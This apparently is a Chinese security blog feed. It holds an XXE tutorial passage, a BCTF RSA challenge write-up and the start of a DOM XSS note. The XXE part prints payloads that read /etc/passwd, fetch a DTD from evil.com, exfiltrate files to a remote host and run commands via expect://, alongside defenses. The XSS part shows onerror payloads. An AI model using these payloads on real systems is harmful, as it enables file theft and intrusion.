&quot;文件名&quot;&gt;</code><br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><h6 id="内部声明实体"><a href="#内部声明实体" class="headerlink" title="内部声明实体"></a>内部声明实体</h6><p><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p><h6 id="引用外部实体"><a href="#引用外部实体" class="headerlink" title="引用外部实体"></a>引用外部实体</h6><p><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>或者<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p><h6 id="漏洞描述摘自OWASP"><a href="#漏洞描述摘自OWASP" class="headerlink" title="漏洞描述摘自OWASP"></a>漏洞描述摘自<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="noopener">OWASP</a></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</span><br></pre></td></tr></table></figure><p>漏洞成因为XML解析器配置不安全时，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h3 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h3><p>恶意引入外部实体方式：</p><ul><li>本地文件读取</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>远程文件读取</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://evil.com/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">其中evil.dtd文件内容</span><br><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是如果遇到读取多行的文件，可能会读不出来，这里可以看一下<a href="http://zone.wooyun.org/content/26651" target="_blank" rel="noopener">ftp接受xxe数据</a><br>不同的语言默认支持的协议不同</p><table><thead><tr><th>libxml2</th><th>php</th><th>java</th><th>.net</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress.zip<br>compress.bzip2<br>data<br>glob<br>phar</td><td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td><td>http<br>file<br>https<br>ftp</td></tr></tbody></table><p>上述为默认支持协议，还可以通过扩展支持其他协议，如php</p><table><thead><tr><th>scheme</th><th>extension required</th></tr></thead><tbody><tr><td>https<br>ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><h6 id="demo1-任意读取本地文件"><a href="#demo1-任意读取本地文件" class="headerlink" title="demo1 任意读取本地文件"></a>demo1 任意读取本地文件</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><h6 id="demo2-不回显读取内容，远程传递数据"><a href="#demo2-不回显读取内容，远程传递数据" class="headerlink" title="demo2 不回显读取内容，远程传递数据"></a>demo2 不回显读取内容，远程传递数据</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/issue"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">远程DTD文件内容</span><br><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;"</span>&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><h6 id="demo3-执行系统命令"><a href="#demo3-执行系统命令" class="headerlink" title="demo3 执行系统命令"></a>demo3 执行系统命令</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "expect://id"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>执行成功需要php的expect扩展</p><h6 id="demo4-探测内网应用"><a href="#demo4-探测内网应用" class="headerlink" title="demo4 探测内网应用"></a>demo4 探测内网应用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "http://192.168.1.20:80"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>如果不存在该ip的应用，会有warning failed to open stream，通过这种方式探测内容应用<br>同时如果找到了内容应用，可以通过这种方式攻击内网应用</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h6 id="方案一、使用开发语言提供的禁用外部实体的方法"><a href="#方案一、使用开发语言提供的禁用外部实体的方法" class="headerlink" title="方案一、使用开发语言提供的禁用外部实体的方法"></a>方案一、使用开发语言提供的禁用外部实体的方法</h6><ol><li>PHP：<br>libxml_disable_entity_loader(true);</li><li>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</li><li>Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</li></ol><h6 id="方案二、过滤用户提交的XML数据"><a href="#方案二、过滤用户提交的XML数据" class="headerlink" title="方案二、过滤用户提交的XML数据"></a>方案二、过滤用户提交的XML数据</h6><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p><h3 id="json节点的Content-Type-XXE攻击"><a href="#json节点的Content-Type-XXE攻击" class="headerlink" title="json节点的Content-Type XXE攻击"></a>json节点的Content-Type XXE攻击</h3><p>如今很多web应用程序使用的都是json格式的数据传递，通过在http request头中带入<code>Content-Type: application/json</code>表明传递的是json格式的数据。但是有时候服务器可以接受开发人员没有意料到的其他数据格式，如xml格式。如果服务器可以接受xml格式的数据，那么就有可能存在xxe。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>将如上的<code>Content-Type</code>改为xml格式的再发送<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>如果返回的数据是一样的，那么就说明服务器可以接受xml格式的数据，那么我们就可以利用xxe来攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure></p><p>但是并不是所有的json节点都是接受xml格式的数据的。有可能返回解析错误的提示或者415不支持媒体类型的错误消息</p><h5 id="带上一个xxe-cheat-sheet，DTD-Attacks"><a href="#带上一个xxe-cheat-sheet，DTD-Attacks" class="headerlink" title="带上一个xxe-cheat-sheet，DTD-Attacks"></a>带上一个<a href="http://web-in-security.blogspot.hk/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">xxe-cheat-sheet</a>，<a href="https://github.com/RUB-NDS/DTD-Attacks" target="_blank" rel="noopener">DTD-Attacks</a></h5><h2 id="参考security-tencent-com，91ri-org"><a href="#参考security-tencent-com，91ri-org" class="headerlink" title="参考security.tencent.com，91ri.org"></a>参考<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a>，<a href="https://www.91ri.org/12814.html" target="_blank" rel="noopener">91ri.org</a></h2>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCTF Crypto SpecialRSA writeup</title>
      <link href="2016/03/20/old-old-CTF-BCTF-Crypto-SpecialRSA-writeup/"/>
      <url>2016/03/20/old-old-CTF-BCTF-Crypto-SpecialRSA-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="http://blog.0kami.cn/images/bctf/specialRSA.jpg" alt="题目描述"><br><a id="more"></a><br>将附带的<a href="http://blog.0kami.cn/static/special_rsa.zip" title="zip">zip</a>文件下载并解压。可以看到以下几个文件：</p><ul><li>加密算法</li><li>示例密文</li><li>示例明文</li><li>加密的flag文件<br>大致我们可以看出来，题目的意图为通过示例密明文，算出加密秘钥k，然后通过k解密flag文件。阅读加解密算法，我们可以得出以下的数学公式：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext</span><br><span class="line">   encode c=[(k^r%N)*m]%N</span><br><span class="line">   decode m=[(d^r%N)*c]%N</span><br><span class="line">   已知2组(m,r,c) N 的值</span><br><span class="line">   求解k</span><br></pre></td></tr></table></figure></li></ul><p>到这里卡了很久，一直没个正确的方式来获取k，不用数学就会忘记啊啊啊啊啊啊啊。后来求组了老师，得到了一个思路。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">下面所有^-1表示对应的乘法逆元</span><br><span class="line">   假设gcd(r1,r2)=1,那么存在a,b使得公式r1*a+r2*b=1</span><br><span class="line">   那么   k^1</span><br><span class="line">         =k^(r1*a+r2*b)</span><br><span class="line">         =k^(r1*a) * k^(r2*b)</span><br><span class="line">         =(k^r1)^a * (k^r2)^b</span><br><span class="line">而k^rn 可以通过(m,r,c)对来获得</span><br><span class="line">这里直接使用encode公式c=[(k^r%N)*m]%N</span><br><span class="line">通过推导可以得出k^r=c*(m^-1)</span><br><span class="line">m的逆元可以通过扩展欧几里德算法来求得</span><br></pre></td></tr></table></figure></p><p>有了上面的思路，就可以写程序来加解密了，这里我用了python来写，其中(m,r,c)对我事先拿出来了，清楚一点,下面的程序是来算k的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import msgpack</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">N = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131L</span><br><span class="line"></span><br><span class="line">def Ext_Euclid (a , b ):</span><br><span class="line">        <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">        扩展欧几里得算法  a*x + b*y = gcd(a,b)  返回 x,y以及a，b的最大公约数gcd</span></span><br><span class="line"><span class="string">        :param a:</span></span><br><span class="line"><span class="string">        :param b:</span></span><br><span class="line"><span class="string">        :return:x,y以及a，b的最大公约数gcd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        '</span><span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> (b == 0):</span><br><span class="line">            <span class="built_in">return</span> 1 , 0 , a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x , y , q=Ext_Euclid( b , a % b )</span><br><span class="line">            x , y = y,( x - (a // b) * y )</span><br><span class="line">            <span class="built_in">return</span> x , y , q</span><br><span class="line">m1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360L</span><br><span class="line"></span><br><span class="line">c1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886L</span><br><span class="line"></span><br><span class="line">m11=RSA.inverse(m1,N)<span class="comment"># 求逆元</span></span><br><span class="line">kr1=m11*c1</span><br><span class="line"></span><br><span class="line">m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258L</span><br><span class="line"></span><br><span class="line">c2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597L</span><br><span class="line"></span><br><span class="line">m21=RSA.inverse(m2,N)</span><br><span class="line">kr2=m21*c2</span><br><span class="line"><span class="comment"># print kr2</span></span><br><span class="line"></span><br><span class="line">r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443L</span><br><span class="line"></span><br><span class="line">r2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059L</span><br><span class="line"></span><br><span class="line">a,b,_=Ext_Euclid(r1,r2)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="built_in">print</span> b</span><br><span class="line"><span class="comment"># print a*r1+b*r2</span></span><br><span class="line"></span><br><span class="line">x1=RSA.inverse(kr2,N)</span><br><span class="line">k=(pow(kr1, a,N)*pow(x1,-b,N))%N</span><br><span class="line"><span class="built_in">print</span> k</span><br></pre></td></tr></table></figure></p><p>通过上面的程序可以算出</p><p><code>k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L</code></p><p>接下来就简单了将k带入官方的算法就可以得到flag.<code>BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}</code><br>上面程序中需要注意的是pow函数不支持指数为负数的情况，所以还要再转一下弯。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&gt;0,b&lt;0</span><br><span class="line">(k^r)^b</span><br><span class="line">=(k^-r)^-b</span><br><span class="line">所以可以先求出k^r mod N的逆元</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>数学方面的知识还是短板啊，以后得加强一下:)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOM XSS</title>
      <link href="2016/03/17/old-old-DOM-XSS/"/>
      <url>2016/03/17/old-old-DOM-XSS/</url>
      
        <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>　　这几天阅读了<em>《Web前端黑客技术揭秘》</em> ，对DOM型的XSS进行一个总结，内容主要为书中提到的知识点，整理整理作以后复习所用。<br>　　DOM类型的XSS与反射型、存储型XSS都不同，DOM型XSS不用服务器端解析响应的参与，触发DOM型XSS可以说主要依靠浏览器客户端的解析。常见的输出点见<strong>0x04附录</strong>。<br><a id="more"></a></p><h3 id="DOM渲染"><a href="#DOM渲染" class="headerlink" title="DOM渲染"></a>DOM渲染</h3><p>　　首先我们来理解一下HTML与Javascript自解码机制，查看以下三个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;</span><br><span class="line">2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function HtmlEncode(str) &#123;</span><br><span class="line">var s=&quot;&quot;;</span><br><span class="line">if(str.length==0) return &quot;&quot;;</span><br><span class="line">s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;);</span><br><span class="line">s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;);</span><br><span class="line">s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;);</span><br><span class="line">s=str.replace(/\&quot;/g, &quot;&amp;quot;&quot;);</span><br><span class="line">return s;</span><br><span class="line">&#125;</span><br><span class="line">3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p>　　对于第一种情况，很清楚，点击这个按钮后，会将<code>&lt;img src=@ onerror=alert(123) /&gt;</code>写入DOM中，并触发<code>alert(123)</code>。而第二种与第三种，<code>document.write</code>的内容都变成了<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>，区别在于一个是在HTML标签中,一个是通过Javascript处理后才变成这个样子的，那么这2种情况都会触发弹窗吗？答案是第二种不会，而第三种会触发。<br>　　形成这样的原因就是因为HTML与Javascript自解码机制，在HTML标签中的javascript可以进行HTML形式的编码。在HTML标签中的javascript代码会先被HTML形式的编码进行解码，即第三种情况中<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>在javascript运行前已经解码为<code>&lt;img src=@ onerror=alert(123) /&gt;</code>，而第二种情况为javascript运行中进行的HTML形式的编码，所以写到DOM中时直接显示在页面上。<br>HTML中的编码：</p><ul><li>进制编码：&#xH;(十六进制格式)、&#D;(十进制格式),最后的分号可以不要</li><li>HTML实体编码：即上面的那个HtmlEncode</li></ul><p>　　那么同样的，在javascript上下文环境中，将内容改为javascript的编码，同样会自解码，我们来看下一个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function $(id)&#123;return document.getElementById(id);&#125;;</span><br><span class="line">$(&apos;exec_btn&apos;).onclick=function()&#123;</span><br><span class="line">document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;);</span><br><span 